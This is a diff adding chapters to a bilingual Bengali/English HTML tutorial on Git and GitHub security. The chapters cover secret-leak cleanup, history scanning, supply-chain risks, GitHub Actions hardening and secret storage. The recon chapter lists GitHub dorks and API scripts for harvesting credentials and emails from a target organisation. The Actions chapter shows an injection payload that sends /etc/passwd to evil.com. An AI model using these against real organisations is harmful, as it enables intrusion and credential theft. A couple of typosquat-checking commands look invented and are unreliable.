+        <li><strong><span class="bn-text">Audit করো</span><span class="en-text">Audit</span></strong> — <span class="bn-text">কে কে এই key ব্যবহার করেছে? CloudTrail / Access Log দেখো</span><span class="en-text">Who used this key? Check CloudTrail / Access Log</span></li>
+        <li><strong><span class="bn-text">History Clean করো</span><span class="en-text">Clean History</span></strong> — BFG Repo Cleaner দিয়ে commit-এ থাকা secret মুছো</li>
+        <li><strong><span class="bn-text">Notify করো</span><span class="en-text">Notify</span></strong> — <span class="bn-text">Security team ও affected users-কে জানাও</span><span class="en-text">Inform your security team and affected users</span></li>
+      </ol>
+    </div>
+
+    <div class="code">
+<span class="c"># BFG Repo Cleaner — Git History থেকে secret মুছো</span>
+<span class="c"># Download: https://rtyley.github.io/bfg-repo-cleaner/</span>
+
+<span class="c"># Secret string ধারণকারী সব commit মুছো:</span>
+java -jar bfg.jar --replace-text passwords.txt my-repo.git
+<span class="c"># passwords.txt-এ: AKIAIOSFODNN7EXAMPLE (একটি প্রতি লাইন)</span>
+
+<span class="c"># নির্দিষ্ট file remove করো:</span>
+java -jar bfg.jar --delete-files .env my-repo.git
+java -jar bfg.jar --delete-files id_rsa my-repo.git
+
+<span class="c"># তারপর cleanup:</span>
+cd my-repo.git
+git reflog expire --expire=now --all
+git gc --prune=now --aggressive
+git push --force
+
+<span class="c"># git filter-branch (traditional, ধীর):</span>
+git filter-branch --force --index-filter \
+  "git rm --cached --ignore-unmatch path/to/secret_file" \
+  --prune-empty --tag-name-filter cat -- --all
+    </div>
+
+    <div class="chapter-summary">
+      <h3>💀 Secret Leak <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ <span class="bn-text">API key, password কখনো code-এ লিখবে না</span><span class="en-text">Never write API keys or passwords in code</span></li>
+        <li>✅ <span class="bn-text">Leak হলে প্রথমে Rotate করো, তারপর History clean করো</span><span class="en-text">If leaked, first Rotate, then clean History</span></li>
+        <li>✅ BFG Repo Cleaner → <span class="bn-text">সহজ ও দ্রুত History cleaner</span><span class="en-text">Easy and fast History cleaner</span></li>
+        <li>✅ <span class="bn-text">Public repo-তে একবার push হলে assume করো compromised</span><span class="en-text">Once pushed to a public repo, assume it's compromised</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CH 03: GIT HISTORY SCANNING ══ -->
+<div class="chapter ch3">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 03</div>
+    <div class="chapter-title">🔍 Git History Scanning</div>
+    <div class="chapter-desc"><span class="bn-text">TruffleHog, Gitleaks দিয়ে পুরনো commit-এ লুকানো secret খোঁজো</span><span class="en-text">Find hidden secrets in old commits with TruffleHog and Gitleaks</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">TruffleHog — <span class="bn-text">সবচেয়ে শক্তিশালী Secret Scanner</span><span class="en-text">The Most Powerful Secret Scanner</span></h2>
+    <div class="code">
+<span class="c"># Install:</span>
+pip3 install truffleHog3
+<span class="c"># অথবা:</span>
+curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin
+
+<span class="c">══ Local Repo Scan ══</span>
+trufflehog git file://./my-repo           <span class="c"># Local repo</span>
+trufflehog git file://./my-repo --only-verified  <span class="c"># শুধু verified secrets</span>
+trufflehog git file://./my-repo --since-commit HEAD~100  <span class="c"># শেষ ১০০ commit</span>
+
+<span class="c">══ GitHub Repo Scan ══</span>
+trufflehog github --repo https://github.com/target/app
+trufflehog github --org targetorg          <span class="c"># পুরো organization!</span>
+
+<span class="c">══ Filesystem Scan ══</span>
+trufflehog filesystem /path/to/scan
+trufflehog filesystem . --json            <span class="c"># JSON output</span>
+
+<span class="c">══ S3 / GCS Scan ══</span>
+trufflehog s3 --bucket my-bucket
+trufflehog gcs --project my-project --bucket my-bucket
+
+<span class="c"># Output example:</span>
+<span class="g">🐷 TruffleHog. Sniffing out secrets...</span>
+<span class="r">Found verified secret!</span>
+<span class="y">Detector Type: AWS
+Raw: AKIAIOSFODNN7EXAMPLE
+Commit: a3f8b2c
+File: config/database.yml
+Line: 15</span>
+    </div>
+
+    <h2 class="sec">Gitleaks — <span class="bn-text">Fast ও Configurable</span><span class="en-text">Fast & Configurable</span></h2>
+    <div class="code">
+<span class="c"># Install:</span>
+sudo apt install gitleaks
+<span class="c"># অথবা:</span>
+brew install gitleaks
+
+<span class="c">══ Basic Scan ══</span>
+gitleaks detect --source .               <span class="c"># Current dir</span>
+gitleaks detect --source . --verbose     <span class="c"># বিস্তারিত</span>
+gitleaks detect --source . -f json -r report.json  <span class="c"># JSON report</span>
+gitleaks detect --source . --no-git      <span class="c"># Git ছাড়া scan</span>
+
+<span class="c">══ Specific Branch/Commit ══</span>
+gitleaks detect --log-opts="HEAD~10..HEAD"    <span class="c"># শেষ ১০ commit</span>
+gitleaks detect --log-opts="main..feature"    <span class="c"># Branch diff</span>
+
+<span class="c">══ Pre-commit hook হিসেবে ══</span>
+gitleaks protect --staged                 <span class="c"># Staged file check</span>
+
+<span class="c">══ Custom Rules ══</span>
+<span class="c"># .gitleaks.toml file তৈরি করো:</span>
+[[rules]]
+id = "my-company-token"
+description = "My Company Internal Token"
+regex = '''MYCO-[0-9a-zA-Z]{32}'''
+tags = ["key", "company"]
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Manual Git History Analysis</span><span class="en-text">Manual Git History Analysis</span></h2>
+    <div class="code">
+<span class="c"># Git log দিয়ে sensitive file খোঁজো:</span>
+git log --all --full-history -- "**/.env"
+git log --all --full-history -- "**/config*"
+git log --all --full-history -- "**/*secret*"
+git log --all --full-history -- "**/id_rsa"
+git log --all --full-history -- "**/*.pem"
+
+<span class="c"># নির্দিষ্ট string আছে এমন commit খোঁজো:</span>
+git log --all -S "password"               <span class="c"># "password" add/remove করা commit</span>
+git log --all -S "SECRET_KEY"
+git log --all --grep="password"            <span class="c"># Commit message-এ</span>
+
+<span class="c"># পুরনো commit-এ কী ছিল দেখো:</span>
+git show COMMIT_HASH:path/to/file
+git show a3f8b2c:config/database.yml
+
+<span class="c"># Deleted file recover করো:</span>
+git log --all --diff-filter=D -- "*/.env"  <span class="c"># Delete করা .env খোঁজো</span>
+git show COMMIT_HASH^:path/to/deleted_file <span class="c"># Delete করার আগের version</span>
+
+<span class="c"># সব branch-এ search:</span>
+git grep "API_KEY" $(git rev-list --all)    <span class="c"># সব commit-এ grep</span>
+git grep -i "password" HEAD~100..HEAD       <span class="c"># শেষ ১০০ commit</span>
+    </div>
+
+    <h2 class="sec">Other Tools</h2>
+    <div class="code">
+<span class="c"># git-secrets (AWS Labs) — pre-commit hook</span>
+brew install git-secrets
+git secrets --install                     <span class="c"># repo-তে install</span>
+git secrets --register-aws                <span class="c"># AWS pattern register</span>
+git secrets --scan                        <span class="c"># Manual scan</span>
+git secrets --scan-history                <span class="c"># History scan</span>
+
+<span class="c"># detect-secrets (Yelp)</span>
+pip3 install detect-secrets
+detect-secrets scan > .secrets.baseline   <span class="c"># Baseline তৈরি</span>
+detect-secrets audit .secrets.baseline    <span class="c"># Review করো</span>
+
+<span class="c"># GitGuardian (SaaS) — Real-time monitoring</span>
+<span class="c"># https://dashboard.gitguardian.com</span>
+<span class="c"># GitHub App হিসেবে install করো → সব push monitor করবে</span>
+pip3 install ggshield
+ggshield secret scan repo .
+ggshield secret scan pre-commit           <span class="c"># Pre-commit hook</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🔍 Git Scanning <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ TruffleHog → <span class="bn-text">Verified secrets, সবচেয়ে accurate</span><span class="en-text">Verified secrets, most accurate</span></li>
+        <li>✅ Gitleaks → <span class="bn-text">দ্রুত, CI/CD-এ ব্যবহার করো</span><span class="en-text">Fast, use in CI/CD</span></li>
+        <li>✅ <code>git log --all -S "password"</code> → <span class="bn-text">Manual search</span><span class="en-text">Manual search</span></li>
+        <li>✅ GitGuardian → <span class="bn-text">Real-time monitoring, free for public repos</span><span class="en-text">Real-time monitoring, free for public repos</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CH 04: GITHUB RECON ══ -->
+<div class="chapter ch4">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 04</div>
+    <div class="chapter-title">🕵️ GitHub Recon — OSINT</div>
+    <div class="chapter-desc"><span class="bn-text">GitHub দিয়ে target সম্পর্কে তথ্য সংগ্রহ</span><span class="en-text">Gathering information about a target through GitHub</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">GitHub Dorking — <span class="bn-text">Advanced Search</span><span class="en-text">Advanced Search</span></h2>
+    <div class="code">
+<span class="c"># GitHub Search Operators:</span>
+<span class="c"># https://github.com/search?q=QUERY&type=code</span>
+
+<span class="c">══ Secret খোঁজার Dorks ══</span>
+org:targetcompany "api_key"
+org:targetcompany "secret_key"
+org:targetcompany "password" extension:env
+org:targetcompany "AWS_ACCESS_KEY_ID"
+org:targetcompany "PRIVATE_KEY" filename:.env
+org:targetcompany filename:.env DB_PASSWORD
+org:targetcompany language:python "import boto3" "aws_access_key"
+
+<span class="c">══ Config File খোঁজা ══</span>
+org:targetcompany filename:config.yml
+org:targetcompany filename:.npmrc _authToken
+org:targetcompany filename:wp-config.php
+org:targetcompany filename:settings.py SECRET_KEY
+org:targetcompany filename:Dockerfile password
+
+<span class="c">══ Credential খোঁজা ══</span>
+org:targetcompany "BEGIN RSA PRIVATE KEY"
+org:targetcompany "BEGIN OPENSSH PRIVATE KEY"
+org:targetcompany smtp password
+org:targetcompany "jdbc:mysql" password
+
+<span class="c">══ Internal Info খোঁজা ══</span>
+org:targetcompany "internal use only"
+org:targetcompany "do not share"
+org:targetcompany filename:*.sql dump
+org:targetcompany "192.168." OR "10.0." OR "172.16."   <span class="c"># Internal IPs</span>
+    </div>
+
+    <h2 class="sec">GitHub API — <span class="bn-text">Automated Recon</span><span class="en-text">Automated Recon</span></h2>
+    <div class="code">
+<span class="c"># GitHub API দিয়ে automated search:</span>
+
+<span class="c"># Organization-এর সব repo:</span>
+curl -H "Authorization: token YOUR_GITHUB_TOKEN" \
+  "https://api.github.com/orgs/targetorg/repos?per_page=100"
+
+<span class="c"># Code search:</span>
+curl -H "Authorization: token YOUR_GITHUB_TOKEN" \
+  "https://api.github.com/search/code?q=password+org:targetorg"
+
+<span class="c"># User-এর সব repo:</span>
+curl "https://api.github.com/users/targetuser/repos?per_page=100"
+
+<span class="c"># Python দিয়ে automated recon:</span>
+<span class="k">import</span> requests
+
+TOKEN = <span class="s">"YOUR_GITHUB_TOKEN"</span>
+ORG = <span class="s">"targetorg"</span>
+headers = {<span class="s">"Authorization"</span>: f<span class="s">"token {TOKEN}"</span>}
+
+<span class="c"># সব repo list করো</span>
+resp = requests.get(f<span class="s">"https://api.github.com/orgs/{ORG}/repos"</span>, headers=headers)
+repos = [r[<span class="s">'name'</span>] <span class="k">for</span> r <span class="k">in</span> resp.json()]
+print(f<span class="s">"Found {len(repos)} repos"</span>)
+
+<span class="c"># Secret search:</span>
+for keyword in [<span class="s">"password"</span>, <span class="s">"api_key"</span>, <span class="s">"secret"</span>]:
+    url = f<span class="s">"https://api.github.com/search/code?q={keyword}+org:{ORG}"</span>
+    r = requests.get(url, headers=headers)
+    items = r.json().get(<span class="s">'items'</span>, [])
+    print(f<span class="s">"{keyword}: {len(items)} results"</span>)
+    </div>
+
+    <h2 class="sec">Gist <span class="bn-text">ও Fork — লুকানো তথ্যের উৎস</span><span class="en-text">& Forks — Hidden Information Sources</span></h2>
+    <div class="code">
+<span class="c"># GitHub Gist — প্রায়ই sensitive info থাকে</span>
+<span class="c"># https://gist.github.com/search?q=target+password</span>
+
+<span class="c"># Gist-এ API key খোঁজো:</span>
+<span class="c"># https://gist.github.com/search?q=AWS_ACCESS_KEY_ID</span>
+
+<span class="c"># Fork-এ Deleted Secret থাকতে পারে!</span>
+<span class="c"># Original repo-তে delete করলেও Fork-এ থাকে</span>
+<span class="c"># GitHub Network Graph দেখো: repo/network/members</span>
+
+<span class="c"># gitrob — Organization recon tool:</span>
+gitrob analyze targetorg --github-access-token TOKEN
+
+<span class="c"># gh-dork — GitHub dork automation:</span>
+pip3 install gh-dork
+gh-dork -o targetorg -df dorks.txt    <span class="c"># Dork file থেকে</span>
+
+<span class="c"># Commit author email harvest:</span>
+git log --format="%ae" | sort -u       <span class="c"># সব committer email</span>
+<span class="c"># → Internal email address, username reveal হতে পারে</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🕵️ GitHub Recon <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ GitHub Search → <code>org:target filename:.env</code> → <span class="bn-text">শুরু করো</span><span class="en-text">Start here</span></li>
+        <li>✅ Gist → <span class="bn-text">প্রায়ই API key, token থাকে</span><span class="en-text">Often contains API keys, tokens</span></li>
+        <li>✅ Fork → <span class="bn-text">Original-এ delete হলেও Fork-এ থাকে</span><span class="en-text">Even if deleted from the original, it remains in Forks</span></li>
+        <li>✅ <span class="bn-text">Rate limit এড়াতে GitHub Token ব্যবহার করো</span><span class="en-text">Use a GitHub Token to avoid rate limits</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CH 05: SUPPLY CHAIN ══ -->
+<div class="chapter ch5">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 05</div>
+    <div class="chapter-title">🏭 Supply Chain Attack</div>
+    <div class="chapter-desc"><span class="bn-text">Dependency-এর মাধ্যমে আক্রমণ — সবচেয়ে বিপজ্জনক নতুন threat</span><span class="en-text">Attacks through dependencies — the most dangerous emerging threat</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec"><span class="bn-text">Supply Chain Attack কী?</span><span class="en-text">What is a Supply Chain Attack?</span></h2>
+    <p><span class="bn-text">তোমার code-এ সরাসরি attack না করে, তোমার ব্যবহৃত library/dependency-কে compromise করা হয়। তুমি trusted package install করো, কিন্তু সেটার ভেতরে malicious code থাকে।</span><span class="en-text">Instead of attacking your code directly, the library/dependency you use is compromised. You install a trusted package, but it contains malicious code inside.</span></p>
+
+    <div class="grid2">
+      <div class="card danger-card">
+        <h4>💥 <span class="bn-text">বিখ্যাত Incidents</span><span class="en-text">Famous Incidents</span></h4>
+        <ul>
+          <li><strong>SolarWinds (2020)</strong> — <span class="bn-text">Build process compromise → 18,000 org</span><span class="en-text">Build process compromised → 18,000 orgs</span></li>
+          <li><strong>XZ Utils (2024)</strong> — <span class="bn-text">Backdoor in compression library, SSH impact</span><span class="en-text">Backdoor in compression library, SSH impact</span></li>
+          <li><strong>event-stream (2018)</strong> — <span class="bn-text">npm package-এ malicious code → Bitcoin theft</span><span class="en-text">Malicious code in npm package → Bitcoin theft</span></li>
+          <li><strong>Colors.js (2022)</strong> — <span class="bn-text">Maintainer intentionally broke package</span><span class="en-text">Maintainer intentionally broke package</span></li>
+          <li><strong>PyPI attacks</strong> — <span class="bn-text">Typosquatting দিয়ে credential theft</span><span class="en-text">Credential theft via typosquatting</span></li>
+        </ul>
+      </div>
+      <div class="card orange-card">
+        <h4>🎯 <span class="bn-text">Attack Types</span><span class="en-text">Attack Types</span></h4>
+        <ul>
+          <li><strong>Typosquatting</strong> — <span class="bn-text">নামের ভুল: <code>reqeusts</code> vs <code>requests</code></span><span class="en-text">Name typo: <code>reqeusts</code> vs <code>requests</code></span></li>
+          <li><strong>Dependency Confusion</strong> — <span class="bn-text">Internal package name নিয়ে public-এ</span><span class="en-text">Internal package name used publicly</span></li>
+          <li><strong>Account Takeover</strong> — <span class="bn-text">Maintainer account hack</span><span class="en-text">Maintainer account hacked</span></li>
+          <li><strong>Malicious PR</strong> — <span class="bn-text">Backdoor PR merge করানো</span><span class="en-text">Getting a backdoor PR merged</span></li>
+          <li><strong>CI/CD Compromise</strong> — <span class="bn-text">Build pipeline-এ attack</span><span class="en-text">Attack on build pipeline</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">Dependency Confusion Attack</h2>
+    <div class="code">
+<span class="c"># কীভাবে কাজ করে:</span>
+<span class="c"># কোম্পানির internal package: @company/internal-utils (private registry)</span>
+<span class="c"># Attacker public npm-এ: @company/internal-utils upload করে higher version দিয়ে</span>
+<span class="c"># npm সবসময় highest version নেয় → Attacker-এর package install হয়!</span>
+
+<span class="c"># Check করো:</span>
+npm audit                              <span class="c"># Known vulnerabilities</span>
+npm audit --audit-level=high           <span class="c"># High ও Critical</span>
+pip audit                              <span class="c"># Python</span>
+
+<span class="c"># Package integrity verify করো:</span>
+npm ci --ignore-scripts                <span class="c"># Script execution বন্ধ</span>
+pip install --require-hashes -r requirements.txt  <span class="c"># Hash verify</span>
+
+<span class="c"># Typosquatting detect:</span>
+<span class="c"># pip install requests → OK</span>
+<span class="c"># pip install reqeusts → Typosquat!</span>
+
+<span class="c"># Popular typosquatting tools:</span>
+<span class="c"># pip install orsquat → requests check করে</span>
+twistd -t pypi requests                <span class="c"># Typosquat list</span>
+    </div>
+
+    <h2 class="sec">SBOM — <span class="bn-text">Dependency List তৈরি করো</span><span class="en-text">Create a Dependency List</span></h2>
+    <div class="code">
+<span class="c"># SBOM (Software Bill of Materials) — কোন package কোন version</span>
+
+<span class="c"># Python:</span>
+pip freeze > requirements.txt           <span class="c"># সব dependency lock</span>
+pip-audit -r requirements.txt          <span class="c"># Vulnerability check</span>
+
+<span class="c"># Node.js:</span>
+npm ci                                 <span class="c"># package-lock.json থেকে exact install</span>
+npm audit fix                          <span class="c"># Auto fix</span>
+
+<span class="c"># Syft — SBOM generator:</span>
+syft dir:. -o spdx-json > sbom.json
+syft docker.io/nginx:latest
+
+<span class="c"># Grype — Vulnerability scanner:</span>
+grype dir:.                            <span class="c"># Local scan</span>
+grype sbom:sbom.json                   <span class="c"># SBOM থেকে</span>
+
+<span class="c"># OSV-Scanner (Google):</span>
+osv-scanner -r .                       <span class="c"># Recursive scan</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🏭 Supply Chain <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ <span class="bn-text">Package install করার আগে author, download count, creation date দেখো</span><span class="en-text">Before installing a package, check author, download count, creation date</span></li>
+        <li>✅ <code>npm audit</code> / <code>pip audit</code> → <span class="bn-text">নিয়মিত চালাও</span><span class="en-text">Run regularly</span></li>
+        <li>✅ <code>npm ci</code> → <span class="bn-text">lockfile থেকে exact install, safer than npm install</span><span class="en-text">Exact install from lockfile, safer than npm install</span></li>
+        <li>✅ Dependabot → <span class="bn-text">GitHub-এ auto vulnerability alert চালু করো</span><span class="en-text">Enable auto vulnerability alerts on GitHub</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CH 06: GITHUB ACTIONS ══ -->
+<div class="chapter ch6">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 06</div>
+    <div class="chapter-title">⚙️ GitHub Actions Security</div>
+    <div class="chapter-desc"><span class="bn-text">CI/CD Pipeline-এর Security — Injection, Secret Leak, Poisoned Pipeline</span><span class="en-text">CI/CD Pipeline Security — Injection, Secret Leak, Poisoned Pipeline</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">GitHub Actions <span class="bn-text">Attack Surfaces</span><span class="en-text">Attack Surfaces</span></h2>
+    <div class="code">
+<span class="c"># ১. Command Injection — PR title/body থেকে</span>
+<span class="r"># ❌ ভুল — Injection vulnerable:</span>
+<span class="r">- name: Echo PR title
+  run: echo "${{ github.event.pull_request.title }}"
+  # Attacker PR title: "; curl http://evil.com/$(cat /etc/passwd) #"</span>
+
+<span class="g"># ✅ সঠিক — Environment variable দিয়ে:</span>
+<span class="g">- name: Echo PR title
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo "$PR_TITLE"</span>
+
+<span class="c"># ২. Secret-এ env variable — Log-এ দেখা যাবে না</span>
+<span class="r"># ❌ ভুল — Secret expose:</span>
+<span class="r">- run: echo "API_KEY=${{ secrets.API_KEY }}"  # Log-এ দেখা যাবে!</span>
+
+<span class="g"># ✅ সঠিক:</span>
+<span class="g">- run: do-something
+  env:
+    API_KEY: ${{ secrets.API_KEY }}  # Environment-এ pass করো</span>
+
+<span class="c"># ৩. Third-party Action — Compromised হতে পারে</span>
+<span class="r"># ❌ ভুল — Tag দিয়ে (tag update হতে পারে):</span>
+<span class="r">uses: actions/checkout@v4</span>
+
+<span class="g"># ✅ সঠিক — Commit SHA দিয়ে (immutable):</span>
+<span class="g">uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Secure GitHub Actions Workflow</span><span class="en-text">Secure GitHub Actions Workflow</span></h2>
+    <div class="code">
+<span class="c"># .github/workflows/secure.yml — সঠিক উদাহরণ</span>
+
+name: Secure CI Pipeline
+on:
+  pull_request:
+    branches: [main]
+  push:
+    branches: [main]
+
+<span class="c"># Minimum permissions!</span>
+permissions:
+  contents: read          <span class="c"># শুধু read</span>
+  pull-requests: write    <span class="c"># PR comment-এর জন্য</span>
+
+jobs:
+  security-scan:
+    runs-on: ubuntu-latest
+    <span class="c"># Timeout দাও</span>
+    timeout-minutes: 30
+
+    steps:
+      <span class="c"># SHA দিয়ে pin করো</span>
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          persist-credentials: false   <span class="c"># Credential cache না</span>
+
+      <span class="c"># Secret scan</span>
+      - name: Run Gitleaks
+        uses: gitleaks/gitleaks-action@v2
+
+      <span class="c"># Dependency audit</span>
+      - name: Audit dependencies
+        run: pip audit -r requirements.txt
+
+      <span class="c"># SAST scan</span>
+      - name: Run Bandit (Python SAST)
+        run: |
+          pip install bandit
+          bandit -r . -f json -o bandit-report.json
+
+      <span class="c"># Secret environment-এ pass করো</span>
+      - name: Deploy
+        env:
+          API_KEY: ${{ secrets.API_KEY }}
+          DB_URL: ${{ secrets.DATABASE_URL }}
+        run: ./deploy.sh
+    </div>
+
+    <h2 class="sec">Poisoned Pipeline Execution (PPE)</h2>
+    <div class="code">
+<span class="c"># PPE: PR থেকে malicious code CI/CD-এ চলানো</span>
+
+<span class="c"># Vulnerable: pull_request_target + checkout PR code</span>
+<span class="r">on: pull_request_target     # ❌ secrets access আছে!
+steps:
+  - uses: actions/checkout@v4
+    with:
+      ref: ${{ github.event.pull_request.head.sha }}  # ❌ Attacker code!</span>
+
+<span class="c"># ✅ Safe pattern:</span>
+<span class="g">on: pull_request          # secrets নেই
+# অথবা pull_request_target + env file (checkout ছাড়া)</span>
+
+<span class="c"># OIDC দিয়ে short-lived credentials:</span>
+<span class="g">- name: Configure AWS Credentials
+  uses: aws-actions/configure-aws-credentials@v4
+  with:
+    role-to-assume: arn:aws:iam::ACCOUNT:role/github-role
+    aws-region: us-east-1
+  # Static key লাগে না! OIDC token দিয়ে temporary credential</span>
+
+<span class="c"># Environment protection rules:</span>
+<span class="c"># Settings → Environments → production → Required reviewers</span>
+<span class="c"># → Deployment secrets শুধু approved হলে accessible</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>⚙️ Actions Security <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ <span class="bn-text">Third-party Action → Commit SHA দিয়ে pin করো</span><span class="en-text">Third-party Actions → Pin with commit SHA</span></li>
+        <li>✅ <code>permissions: contents: read</code> → <span class="bn-text">Minimum permission দাও</span><span class="en-text">Give minimum permissions</span></li>
+        <li>✅ <span class="bn-text">User input → env variable দিয়ে pass করো, সরাসরি না</span><span class="en-text">User input → pass via env variable, not directly</span></li>
+        <li>✅ OIDC → <span class="bn-text">Static secret-এর বদলে temporary credential ব্যবহার করো</span><span class="en-text">Use temporary credentials instead of static secrets</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CH 07: SECRET MANAGEMENT ══ -->
+<div class="chapter ch7">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 07</div>
+    <div class="chapter-title">🔑 Secret Management</div>
+    <div class="chapter-desc"><span class="bn-text">Secret কোথায় রাখবে, কীভাবে রাখবে — সঠিক পদ্ধতি</span><span class="en-text">Where and how to store secrets — the right way</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">.gitignore — <span class="bn-text">প্রথম রক্ষা</span><span class="en-text">First Line of Defense</span></h2>
+    <div class="code">
+<span class="c"># .gitignore — এগুলো সবসময় add করো:</span>
+
+<span class="c"># Environment files</span>
+.env
+.env.*
+.env.local
+.env.production
+!.env.example     <span class="c"># Example file OK করো</span>
+
+<span class="c"># Keys & credentials</span>
+*.pem
+*.key
+*.p12
+*.pfx
+id_rsa
+id_rsa.pub
+*.pub
+*.ppk
+
+<span class="c"># Config files</span>
+config.secret.yml
+secrets.yml
+credentials.json
+service-account.json
+*credentials*
+*secret*
+
+<span class="c"># Cloud</span>
+.aws/credentials
+.gcp/
+*.tfvars         <span class="c"># Terraform variables</span>
+terraform.tfstate
+
+<span class="c"># Database</span>
+*.sql
+*.dump
+
+<span class="c"># ইতিমধ্যে tracked file-এ .gitignore কাজ করবে না!</span>
+<span class="c"># Untrack করো:</span>
+git rm --cached .env
+git rm --cached config/secrets.yml
+git commit -m "Remove tracked secrets"
+    </div>
+
+    <h2 class="sec">Pre-commit Hooks — <span class="bn-text">Commit-এর আগে চেক</span><span class="en-text">Check Before Commit</span></h2>
+    <div class="code">
+<span class="c"># pre-commit framework: https://pre-commit.com</span>
+pip install pre-commit
+
+<span class="c"># .pre-commit-config.yaml তৈরি করো:</span>
+repos:
+  - repo: https://github.com/gitleaks/gitleaks
+    rev: v8.18.4
+    hooks:
+      - id: gitleaks
+
+  - repo: https://github.com/pre-commit/pre-commit-hooks
+    rev: v4.5.0
+    hooks:
+      - id: detect-private-key       <span class="c"># Private key detect</span>
+      - id: check-added-large-files  <span class="c"># বড় file (dump হতে পারে)</span>
+      - id: check-merge-conflict
+      - id: trailing-whitespace
+
+  - repo: https://github.com/Yelp/detect-secrets
+    rev: v1.4.0
+    hooks:
+      - id: detect-secrets
+        args: ['--baseline', '.secrets.baseline']
+
+<span class="c"># Install করো:</span>
+pre-commit install        <span class="c"># git hook হিসেবে install</span>
+pre-commit run --all-files  <span class="c"># Manual run</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Secret Store — কোথায় রাখবে?</span><span class="en-text">Secret Stores — Where to Keep Them?</span></h2>
+    <table>
+      <thead><tr><th><span class="bn-text">পদ্ধতি</span><span class="en-text">Method</span></th><th><span class="bn-text">কোথায়</span><span class="en-text">Where</span></th><th><span class="bn-text">ভালো দিক</span><span class="en-text">Pros</span></th><th><span class="bn-text">খারাপ দিক</span><span class="en-text">Cons</span></th><th><span class="bn-text">উপযুক্ত</span><span class="en-text">Best For</span></th></tr></thead>
+      <tbody>
+        <tr><td>GitHub Secrets</td><td>Settings → Secrets</td><td><span class="bn-text">সহজ, free</span><span class="en-text">Easy, free</span></td><td><span class="bn-text">GitHub-এ tied</span><span class="en-text">Tied to GitHub</span></td><td>CI/CD</td></tr>
+        <tr><td>HashiCorp Vault</td><td>Self-hosted</td><td><span class="bn-text">Enterprise-grade</span><span class="en-text">Enterprise-grade</span></td><td><span class="bn-text">Complex setup</span><span class="en-text">Complex setup</span></td><td>Production</td></tr>
+        <tr><td>AWS Secrets Manager</td><td>AWS Cloud</td><td><span class="bn-text">Auto-rotate</span><span class="en-text">Auto-rotate</span></td><td><span class="bn-text">AWS-এ tied, cost</span><span class="en-text">AWS-tied, cost</span></td><td>AWS apps</td></tr>
+        <tr><td>Doppler</td><td>SaaS</td><td><span class="bn-text">সহজ, sync</span><span class="en-text">Easy, sync</span></td><td>Third-party</td><td>Startups</td></tr>
+        <tr><td>.env (local only)</td><td>Local</td><td><span class="bn-text">সহজ</span><span class="en-text">Simple</span></td><td><span class="bn-text">Share করা কঠিন</span><span class="en-text">Hard to share</span></td><td>Development</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">GitHub Secrets — <span class="bn-text">সঠিক ব্যবহার</span><span class="en-text">Correct Usage</span></h2>
+    <div class="code">
+<span class="c"># GitHub Secrets সেট করো:</span>
+<span class="c"># Settings → Secrets and variables → Actions → New secret</span>
+
+<span class="c"># CLI দিয়ে (GitHub CLI):</span>
+gh secret set API_KEY --body "sk-prod-abc123"
+gh secret set DB_PASSWORD &lt; password.txt
+gh secret list                              <span class="c"># Secret list</span>
+
+<span class="c"># Environment-specific secrets:</span>
+gh secret set DEPLOY_KEY --env production
+gh secret set STAGING_KEY --env staging
+
+<span class="c"># Workflow-এ ব্যবহার:</span>
+jobs:
+  deploy:
+    environment: production    <span class="c"># Environment protection</span>
+    steps:
+      - run: deploy.sh
+        env:
+          API_KEY: ${{ secrets.API_KEY }}
+          DB_URL: ${{ secrets.DATABASE_URL }}
+          # ✓ Log-এ *** হিসেবে দেখাবে</span>
+<span class="c">          # ✓ Fork PR-এ accessible নয়</span>
+
+<span class="c"># AWS OIDC (Static key ছাড়া):</span>
+<span class="c"># aws configure oidc provider:</span>
+jobs:
+  deploy:
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789:role/GitHubRole
+          aws-region: us-east-1
+      - run: aws s3 ls   <span class="c"># Temporary credential!</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🔑 Secret Management <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
